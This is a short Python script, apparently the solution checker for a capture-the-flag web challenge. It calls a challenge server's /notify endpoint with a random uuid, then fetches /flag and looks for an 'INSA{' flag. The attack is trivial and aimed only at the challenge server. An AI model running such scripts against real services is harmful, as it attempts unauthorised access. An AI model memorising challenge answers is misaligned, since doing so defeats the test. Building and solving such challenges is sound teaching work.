#!/usr/bin/env python3
# -!- encoding:utf8 -!-
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#     file: exploit
#     date: 2018-03-04
#   author: paul.dautry
#  purpose:
#
#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# =============================================================================
#  IMPORTS
# =============================================================================
import os
import requests
import os.path as path
from uuid import uuid4
from ruamel import yaml
from argparse import ArgumentParser
# =============================================================================
#  CONSTANTS
# =============================================================================
TIMEOUT = 2
# =============================================================================
#  CLASSES
# =============================================================================
##
## @brief      Class for exploit.
##
class Exploit(object):
    ##
    ## @brief      Constructs the object.
    ##
    def __init__(self, host, port):
        super(Exploit, self).__init__()
        self.base_url = 'http://{}:{}'.format(host, port)
    ##
    ## @brief      { function_description }
    ##
    ## @param      route  The route
    ##
    def url(self, route):
        return '{}{}'.format(self.base_url, route)
    ##
    ## @brief      { function_description }
    ##
    def run(self):
        hsep = '=' * 80
        payload = {'uuid': str(uuid4())}

        content = ''
        try:
            s = requests.Session()

            print(hsep)
            resp = s.get(self.url('/'), timeout=TIMEOUT)
            print(resp.content.decode())

            print(hsep)
            resp = s.post(self.url('/notify'), json=payload, timeout=TIMEOUT)
            print(resp.content.decode())
            print(resp.cookies)

            print(hsep)
            resp = s.get(self.url('/flag'), params=payload, timeout=TIMEOUT)
            content = resp.content.decode()
        except Exception as e:
            print(e)
            return False

        print(content)
        return 'INSA{' in content
# =============================================================================
#  SCRIPT
# =============================================================================
if __name__ == '__main__':
    wd = path.dirname(__file__) # != os.getcwd()

    with open(path.join(os.getcwd(), '.mkctf.yml')) as f:
        conf = yaml.safe_load(f)

    parameters = conf['parameters']

    p = ArgumentParser(add_help=True, description="")
    p.add_argument('--host', default=parameters['exploit']['host'],
                   help="")
    p.add_argument('--port', default=parameters['port'], type=int,
                   help="")
    args = p.parse_args()

    e = Exploit(args.host, args.port)

    exit(0 if e.run() else 1)
